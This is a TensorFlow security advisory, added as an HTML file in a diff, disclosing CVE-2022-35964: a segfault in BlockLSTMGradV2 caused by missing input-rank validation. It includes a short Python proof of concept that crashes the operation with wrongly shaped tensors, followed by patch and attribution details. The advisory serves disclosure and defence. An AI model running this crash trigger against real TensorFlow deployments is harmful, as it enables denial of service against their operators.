@@ -1,0 +1,39 @@
+<h2>TFSA-2022-096: Segfault in <code>BlockLSTMGradV2</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35964</p>
+<h3>Impact</h3>
+<p>The implementation of <code>BlockLSTMGradV2</code> does not fully validate its inputs.
+ - <code>wci</code>, <code>wcf</code>, <code>wco</code>, <code>b</code> must be rank 1
+ - <code>w</code>, cs_prev<code>,</code>h_prev<code>must be rank 2
+ -</code>x` must be rank 3
+This results in a a segfault that can be used to trigger a denial of service attack.
+```python
+import tensorflow as tf</p>
+<p>use_peephole = False
+seq_len_max = tf.constant(1, shape=[], dtype=tf.int64)
+x = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+cs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+h_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+w = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+wci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+wcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+wco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+b = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+i = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+cs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+f = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+o = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+ci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+co = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+h = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+cs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+h_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+tf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa">2a458fc4866505be27c62f81474ecb2b870498fa</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.</p>
